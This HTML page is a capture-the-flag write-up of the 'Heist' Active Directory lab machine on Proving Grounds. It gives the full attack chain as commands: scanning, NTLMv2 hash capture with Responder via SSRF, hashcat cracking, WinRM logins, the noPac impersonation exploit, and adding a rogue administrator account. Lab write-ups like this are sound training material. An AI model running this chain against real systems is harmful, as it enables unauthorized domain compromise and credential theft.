<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Proving Grounds Heist Writeup by Rachel Murphy" />
  <title>PG: Heist | Rachel Murphy</title>
  <meta name="description" content="Heist is a hard-rated Active Directory machine on Proving Grounds. This writeup covers SSRF exploitation, NTLMv2 hash capture, Active Directory enumeration, lateral movement, and privilege escalation to SYSTEM.">
  <link rel="stylesheet" href="/assets/css/writeups.css">
  <script src="/assets/css/js/script.js" defer></script>
</head>
<body>

<header>
  <h1>Heist Writeup</h1>
  <p>Proving Grounds</p>
  <nav>
    <ul>
      <li><a href="/index.html">Home</a></li>
      <li><a href="/writeups/index.html">Writeups</a></li>
      <li><a href="/cheatsheets/cheatsheet.html">Cheatsheets</a></li>
      <li><a href="/tools/index.html">Tools</a></li>
      <li><a href="/about.html">About</a></li>
    </ul>
  </nav>
</header>

<main>
  <section class="machine-summary">
    <h2>Machine Overview</h2>
    <p><strong>Difficulty:</strong> Hard</p>
    <p><strong>Platform:</strong> Offensive Security Proving Grounds</p>
    <p><strong>Description:</strong> Heist is a challenging Active Directory machine designed for practicing AD enumeration, exploitation, and privilege escalation techniques. The goal is to gain initial access, perform lateral movement, and escalate privileges to SYSTEM.</p>
  </section>

  <section>
    <h2>Enumerate for Initial Access</h2>
    <p>We start with a network scan to identify open services and potential attack vectors on the machine.</p>
    <div class="code-block">
      <pre>sudo nmap -sC -sV 192.168.120.165 -oN nmap-heist</pre>
    </div>
    <img src="../images/Pasted image 20250707211724.png" alt="">
    <p>The scan identifies HTTP service on port 8080 and reveals the internal domain name <code>heist.offsec</code>, which should be added to <code>/etc/hosts</code> for easier access.</p>
  </section>

  <section>
    <h2>SMB Enumeration</h2>
    <p>Next, we check for SMB shares and accessible resources.</p>
    <img src="../images/Pasted image 20250707211944.png" alt="">
    <p>The domain controller is identified as <code>dc01.heist.offsec</code>. No useful shares are exposed at this stage.</p>
    <img src="../images/Pasted image 20250707212124.png" alt="">
    <p>Further SMB checks do not yield any accessible files or credentials.</p>
  </section>

  <section>
    <h2>RPC Interaction</h2>
    <p>Attempting RPC connections to enumerate services and users.</p>
    <div class="code-block">
      <pre>rpcclient -U '' -N 192.168.120.165</pre>
    </div>
    <img src="../images/Pasted image 20250707212248.png" alt="">
    <p>No useful information is discovered via RPC at this point.</p>
  </section>

  <section>
    <h2>Web Service (Port 8080)</h2>
    <p>Enumeration of the web server to discover directories and potential vulnerabilities using a directory scanner.</p>
    <img src="../images/Pasted image 20250707212425.png" alt="">
    <div class="code-block">
      <pre>feroxbuster -u http://192.168.120.165:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</pre>
    </div>
    <img src="../images/Pasted image 20250707212713.png" alt="">
    <p>Initial web exploration reveals developer hints and possible SSRF points within the web application.</p>
    <img src="../images/Pasted image 20250707213103.png" alt="">
    <img src="../images/Pasted image 20250707213135.png" alt="">
    <img src="../images/Pasted image 20250707213209.png" alt="">
    <img src="../images/Pasted image 20250707213226.png" alt="">
    <img src="../images/Pasted image 20250707213350.png" alt="">
  </section>

  <section>
    <h2>Responder & NTLMv2 Hash Capture</h2>
    <p>Using Responder to capture NTLMv2 hashes from the target machine during an SSRF attack.</p>
    <div class="code-block">
      <pre>sudo responder -I tun1</pre>
    </div>
    <img src="../images/Pasted image 20250707214620.png" alt="">
    <p>The captured NTLMv2 hash can then be cracked offline to retrieve valid credentials.</p>
    <div class="code-block">
      <pre>hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt --force</pre>
    </div>
    <img src="../images/Pasted image 20250707214927.png" alt="">
    <p>Hashcat successfully recovers the credentials: <code>enox:california</code>.</p>
    <img src="../images/Pasted image 20250707215135.png" alt="">
  </section>

  <section>
    <h2>WinRM Access</h2>
    <p>Initial access via WinRM using the recovered enox credentials.</p>
    <div class="code-block">
      <pre>nxc winrm 192.168.120.165 -u 'enox' -p 'california'</pre>
    </div>
    <div class="code-block">
      <pre>evil-winrm -i 192.168.120.165 -u 'enox' -p 'california'</pre>
    </div>
    <img src="../images/Pasted image 20250707215318.png" alt="">
    <img src="../images/Pasted image 20250707215441.png" alt="">
    <p>Once connected, examination of user files and notes provides hints for further privilege escalation.</p>
    <img src="../images/Pasted image 20250707215630.png" alt="">
    <img src="../images/Pasted image 20250707215740.png" alt="">
    <img src="../images/Pasted image 20250707215937.png" alt="">
    <img src="../images/Pasted image 20250707220122.png" alt="">
    <img src="../images/Pasted image 20250707220204.png" alt="">
  </section>

  <section>
    <h2>Privilege Escalation: SeMachineAccountPrivilege</h2>
    <p>Active Directory enumeration reveals that the enox user can impersonate the administrator using the SamAccount spoofing method.</p>
    <div class="code-block">
      <pre>python3 noPac.py heist.offsec/enox:'california' -dc-ip 192.168.120.165 -shell --impersonate administrator -use-ldap</pre>
    </div>
    <img src="../images/Pasted image 20250707221051.png" alt="">
    <p>Successfully impersonating administrator, we can create a new user with administrative privileges.</p>
    <img src="../images/Pasted image 20250707221413.png" alt="">
    <div class="code-block">
      <pre>net user [username] [password] /add
net localgroup administrators [username] /add</pre>
    </div>
    <img src="../images/Pasted image 20250707221642.png" alt="">
    <p>Test the new admin credentials for full system access:</p>
    <div class="code-block">
      <pre>nxc smb 192.168.120.165 -u 'cadet' -p 'Password1!'</pre>
    </div>
    <img src="../images/Pasted image 20250707221809.png" alt="">
    <p>Some tools like impacket-psexec fail, but WinRM access works reliably.</p>
    <img src="../images/Pasted image 20250707222327.png" alt="">
    <img src="../images/Pasted image 20250707222406.png" alt="">
  </section>

  <section>
    <h2>Login as New Admin</h2>
    <p>Using Evil-WinRM to log in as the newly created administrator account and confirm system-level access.</p>
    <div class="code-block">
      <pre>evil-winrm -i 192.168.120.165 -u 'cadet' -p 'Password1!'</pre>
    </div>
    <p>Admin flag captured, confirming successful privilege escalation.</p>
    <img src="../images/Pasted image 20250707222504.png" alt="">
    <img src="../images/Pasted image 20250707222203.png" alt="">
    <p>This concludes the box exploitation: initial access, lateral movement, and SYSTEM access achieved.</p>
  </section>

</main>

  <!-- Footer -->
  <footer>
    <div class="wrap site-footer">
      <p>Â© Rachel Murphy 2025 | <a href="https://github.com/rachhavoc" target="_blank" rel="noopener">GitHub</a> | <a href="/about.html">About</a></p>
      <p><a href="/writeups/index.html">Back to Writeups</a> | <a href="/index.html">Home</a></p>
    </div>
  </footer>

</body>
</html>
